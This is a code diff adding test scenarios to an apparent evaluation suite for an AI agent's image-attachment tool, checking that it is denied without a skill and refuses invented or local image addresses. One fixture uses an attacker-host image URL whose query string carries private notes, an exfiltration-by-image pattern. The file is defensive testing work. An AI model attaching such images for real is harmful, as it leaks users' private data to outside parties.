@@ -159,6 +159,40 @@ const scenarios: ToolGatewayEvalInput[] = [
       repeatResultsEqual: true,
     },
   },
+  {
+    name: "denies image attachment when no skill enables it",
+    toolName: "chat.attach_images",
+    arguments: { images: [{ url: "https://cdn.example.com/villa.jpg", alt: "Villa" }] },
+    enabledTools: [],
+    expected: {
+      responseKind: "denied",
+      toolStatus: "DENIED",
+    },
+  },
+  {
+    name: "refuses to attach an image no tool returned",
+    toolName: "chat.attach_images",
+    arguments: {
+      images: [{ url: "https://attacker.example.net/pixel.gif?notes=private", alt: "Invented" }],
+    },
+    policy: "automatic",
+    expected: {
+      responseKind: "error",
+      toolStatus: "FAILED",
+      errorIncludes: "No tool has returned images in this task",
+    },
+  },
+  {
+    name: "refuses a non-HTTPS or local image address",
+    toolName: "chat.attach_images",
+    arguments: { images: [{ url: "http://127.0.0.1:8080/private.png", alt: "Local" }] },
+    policy: "automatic",
+    expected: {
+      responseKind: "error",
+      toolStatus: "FAILED",
+      errorIncludes: "No image was attached",
+    },
+  },
 ];
 
 describeEval(
